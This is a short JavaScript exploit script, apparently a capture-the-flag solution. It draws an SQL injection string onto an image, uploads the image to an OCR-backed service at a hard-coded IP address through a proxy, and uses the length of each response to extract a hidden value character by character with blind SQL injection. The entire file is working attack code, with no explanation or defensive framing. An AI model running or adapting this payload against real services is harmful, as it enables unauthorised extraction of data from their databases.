const textToPicture = require('text-to-picture');
const axios = require('axios');
const form = require('form-data');

letters = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
  'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5',
  '6', '7', '8', '9', '"', ' ', '&', '$', '.', '?', '#', '!', '@', '=', '¿',
  '/', '[_]', '[[]', '[]]', '\\', 'Ñ', ':', '*', '-', '<', '>'];

//letters = ['','A'];

async function getResponse(flag) {

  let template = '\' OR SUBSTR(UPPER(description),6,30) LIKE \'LO ';
  let url = 'http://45.32.169.98:7372';

  let image = await textToPicture.convert({
    text: template + flag + '%\' --',
    source: {
      width: 1500,
      height: 450,
      background: 0xFF0000FF,
    },
    size: 32,
    quality: 60,
    color: 'white',
  });

  imageBuffer = await image.getBuffer();
  await image.write('image.png');

  let data = new form();
  data.append('file', imageBuffer, 'image.png');

  let response = await axios.post(url, data.getBuffer(), {
    proxy: {
      host: '10.5.1.37',
      port: '8080',
    },
    headers: data.getHeaders(),
  });

  if (response.data.length == 1358) {
    return flag;
  } else {
    return '';
  }

}

async function itera() {
  for (i of letters) {
    let res = await getResponse(i);
    if (res != '') {
      console.log(res);
    }
  }

}

itera();
